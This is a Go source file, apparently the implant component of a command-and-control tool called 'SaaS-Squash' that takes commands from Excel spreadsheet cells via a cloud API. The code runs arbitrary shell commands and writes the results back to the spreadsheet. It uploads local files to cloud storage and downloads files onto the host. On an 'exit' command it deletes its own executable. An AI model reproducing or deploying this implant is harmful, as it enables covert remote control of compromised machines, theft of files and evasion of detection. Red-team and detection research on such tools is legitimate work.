package excel

import (
	"SaaS-Squash/common"
	"bytes"
	"fmt"
	"io"
	"os"
	"strings"
)

type Command struct {
	InputCol  string
	OutputCol string
	Row       int // basically row minus 1, eg A2=1, B7=6
	Input     string
	Output    string
	Err       error
}

func (cmd *Command) Execute(c2 ExcelClient) {

	common.AllC2Configs.Debug.LogDebug("Execute command - " + cmd.Input)

	// download
	if strings.HasPrefix(cmd.Input, "download") {
		cmd.downloadFile(c2)
		return
	}

	// upload
	if strings.HasPrefix(cmd.Input, "upload") {
		cmd.uploadFile(c2)
		return
	}

	// exit
	if cmd.Input == "exit" {
		path, _ := os.Executable()
		os.Remove(path)
		os.Exit(0)
	}

	// else
	cmd.Output, cmd.Err = common.ExecuteCommand(cmd.Input)

}

func (cmd *Command) ExecuteAndUpdate(c2 ExcelClient) {
	//gets here
	var err error
	cmd.Execute(c2)

	coord := fmt.Sprintf("%v%v", cmd.OutputCol, cmd.Row+1)

	common.AllC2Configs.Debug.LogDebug("Executed command, " + cmd.Input + ", writing to " + coord)
	_, _err := c2.UpdateRange(coord, [][]string{{cmd.Output}})
	if _err != nil {
		common.AllC2Configs.Debug.LogFatalDebug(err.Error())
	}
}

func (cmd *Command) uploadFile(c2 ExcelClient) {
	cmd_split := strings.Split(cmd.Input, ";")
	if len(cmd_split) == 2 {
		upload_path := cmd_split[1]
		common.AllC2Configs.Debug.LogDebug("Upload file: " + upload_path)
		// Client.LogDebug("Upload file: " + upload_path)

		file, err := os.Open(upload_path)
		if err != nil {
			common.AllC2Configs.Debug.LogDebugError("Failed to open", err)
			cmd.Output = err.Error()
			return
		}
		defer file.Close()
		bf, _ := io.ReadAll(file)

		// body := &bytes.Buffer{}
		// writer := multipart.NewWriter(body)
		// formFile, _ := writer.CreateFormFile("file", file.Name()) // TODO error here
		// io.Copy(formFile, file)                                   // TODO _, err - handle error
		// writer.Close()                                            // TODO handle err

		req, err := c2.newRequest("PUT", "../../../root:/"+upload_path+":/content", bytes.NewBuffer(bf))
		// req.Header.Set("Content-Type", writer.FormDataContentType())
		req.Header.Set("Content-Type", "application/octet-stream")
		if err != nil {
			common.AllC2Configs.Debug.LogFatalDebugError("Failed to create request: ", err)
		}

		_, err = c2.do_noparse(req)
		if err != nil {
			cmd.Output = err.Error()
			common.AllC2Configs.Debug.LogDebug("Failed http - " + err.Error())
		}
		cmd.Output = "File written"
	}
}

func (cmd *Command) downloadFile(c2 ExcelClient) {
	cmd_split := strings.Split(cmd.Input, ";")
	if len(cmd_split) == 3 {
		remote_file := cmd_split[1]
		local_file := cmd_split[2]
		common.AllC2Configs.Debug.LogDebug("Download file - " + remote_file + " to " + local_file)

		req, err := c2.newRequest("GET", "../../../root:/"+remote_file+":/content", nil)
		if err != nil {
			common.AllC2Configs.Debug.LogFatalDebugError("Failed to create request: ", err)
		}

		resp_body, err := c2.do_noparse(req)
		if err != nil {
			cmd.Output = err.Error()
			common.AllC2Configs.Debug.LogDebug("Failed http - " + err.Error())
		}

		fl, err := os.Create(local_file)
		if err != nil {
			cmd.Output = err.Error()
			common.AllC2Configs.Debug.LogDebug("Failed to create file - " + err.Error())
		}

		_, err = fl.Write(resp_body)
		if err != nil {
			cmd.Output = err.Error()
		} else {
			cmd.Output = fl.Name() + " written"
		}
	}
}
